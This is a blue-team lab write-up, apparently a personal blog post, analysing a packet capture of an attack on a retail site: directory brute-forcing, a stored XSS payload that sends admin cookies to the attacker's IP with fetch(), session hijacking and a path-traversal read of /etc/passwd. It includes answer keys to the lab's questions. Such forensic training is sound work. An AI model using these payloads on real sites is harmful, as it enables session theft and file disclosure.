---
layout: lab
title: RetailBreach
platform: CyberDefenders
difficulty: Easy
category: Network Forensics
tools: Wireshark
tactics: "[Reconnaissance, Initial Access, Execution, Defense Evasion, Credential Access, Discovery, Lateral Movement]"
proof: https://cyberdefenders.org/blueteam-ctf-challenges/achievements/inksec/retailbreach/
challenge_url: https://cyberdefenders.org/blueteam-ctf-challenges/retailbreach/
permalink: /blue-team/labs/retailbreach/
summary: '"Investigate network traffic with Wireshark to identify attacker TTPs, extract XSS payloads and session tokens, and determine exploited web application vulnerabilities."'
art: https://cyberdefenders.org/media/terraform/RetailBreach/RetailBreach_S9g8WLI.webp
---
## Scenario

ShopSphere, a prominent online retail platform, experienced unusual administrative login activity during late-night hours coinciding with customer complaints about unexplained account anomalies. Network traffic was captured to identify the source and method of the breach.

---

## Tooling

- Wireshark

---

## Investigation

### Identifying the Attacker
![retail_conversion.png](retail_conversion.png)
Filtering traffic to isolate attacker activity:

`http && ip.addr == 111.224.180.128`

This revealed the attacker IP `111.224.180.128` conducting a range of malicious activity across the capture.

---
### Directory Brute-Forcing

Analysis of attacker traffic showed a high volume of GET requests to non-existent paths — consistent with directory enumeration. The User-Agent string identified the tool as **Gobuster**, a common directory brute-forcing utility used to discover hidden endpoints.
![retail_gobuster.png](retail_gobuster.png)

---
### XSS — Session Cookie Theft

The attacker injected a malicious script into the reviews endpoint to steal admin session cookies:

`<script>fetch('http://111.224.180.128/' + document.cookie);</script>`

Filtering for GET requests to identify the victim accessing the poisoned page:

`http.request.method == "GET"`

Examining traffic to `reviews.php` revealed the victim IP `135.143.142.5` visiting the page containing the injected script at **2024-03-29 12:09 UTC**, triggering the cookie exfiltration.
``
![retail_cookies.png](retail_cookies.png)

The stolen session cookie was:

`lqkctf24s9h9lg67teu8uevn3q`

![retail_reviews.png](retail_reviews.png)

### Session Hijacking & LFI

With the stolen cookie, the attacker authenticated as the admin and pivoted to the `/admin/log_viewer.php` endpoint. Using a path traversal payload, the attacker accessed the server's `/etc/passwd` file:

`../../../../../etc/passwd`

Confirming the session cookie was used in attacker traffic:

```bash
http && ip.addr == 111.224.180.128 and frame contains "lqkctf24s9h9lg67teu8uevn3q"
```


![[retail_LFI.png]]
## IOCs 

| Type             | Value                                                              |
| ---------------- | ------------------------------------------------------------------ |
| Stolen Cookie    | lqkctf24s9h9lg67teu8uevn3q                                         |
| LFI Payload      | ../../../../../etc/passwd                                          |
| IP               | 111.224.180.128                                                    |
| XSS              | script>fetch('http://111.224.180.128/' + document.cookie);</script |
| Exploited Script | log_viewer.php                                                     |
| Timestamp        | 2024-03-29 12:09 UTC                                               |
| Victim IP        | 135.143.142.5                                                      |
| Tool             | Gobuster                                                           |
## Conclusion

> The attacker enumerated hidden directories using Gobuster, injected a stored XSS payload into the reviews page to steal an admin session cookie, used the hijacked session to access the admin panel, and exploited a path traversal vulnerability in log_viewer.php to read /etc/passwd — demonstrating a full web attack chain from recon through to sensitive file disclosure.

---

## References

- [MITRE T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [MITRE T1110 — Brute Force](https://attack.mitre.org/techniques/T1110/)
- [MITRE T1539 — Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539/)
- [CyberDefenders — RetailBreach Lab](https://cyberdefenders.org/blueteam-ctf-challenges/retailbreach/)

{% include flag.html question="Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address?" answer="111.224.180.128" %}

{% include answer.html question="The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing?" answer="gobuster" %}

{% include flag.html question="Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?" answer="<script>fetch('http://111.224.180.128/' + document.cookie);</script>" %}

{% include answer.html question="Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?" answer="2024-03-29 12:09" %}

{% include flag.html question="The theft of a session token through XSS is a serious security breach that allows unauthorized access. Can you provide the session token that the attacker acquired and used for this unauthorized access?" answer="" %}

{% include answer.html question="Identifying which scripts have been exploited is crucial for mitigating vulnerabilities in a web application. What is the name of the script that was exploited by the attacker?" answer="log_viewer.php" %}

{% include flag.html question="Exploiting vulnerabilities to access sensitive system files is a common tactic used by attackers. Can you identify the specific payload the attacker used to access a sensitive system file?" answer="../../../../../etc/passwd" %}


I successfully completed RetailBreach Blue Team Lab at @CyberDefenders!
https://cyberdefenders.org/blueteam-ctf-challenges/achievements/inksec/retailbreach/
 
#CyberDefenders #CyberSecurity #BlueYard #BlueTeam #InfoSec #SOC #SOCAnalyst #DFIR #CCD #CyberDefender